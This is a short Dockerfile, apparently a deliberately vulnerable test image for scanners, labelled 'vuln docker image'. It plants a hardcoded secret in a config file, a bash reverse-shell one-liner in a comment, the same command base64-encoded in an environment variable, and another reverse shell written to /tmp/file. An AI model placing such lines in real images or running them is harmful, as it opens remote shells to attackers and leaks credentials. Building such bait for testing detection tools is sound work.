FROM busybox:latest

LABEL maintainer="vuln docker image"

ENV SECRET_KEY=123456

# bash -i >&/dev/tcp/127.0.0.1/9999 0>&1
ENV command=YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS85OTk5IDA+JjEK

RUN echo "password=${SECRET_KEY}" > /etc/config.ini && \
    echo "normal string" && \
    echo "bash -i >&/dev/tcp/10.0.0.1/9999 0>&1" > /tmp/file

CMD ["tail", "-f", "/dev/null"]
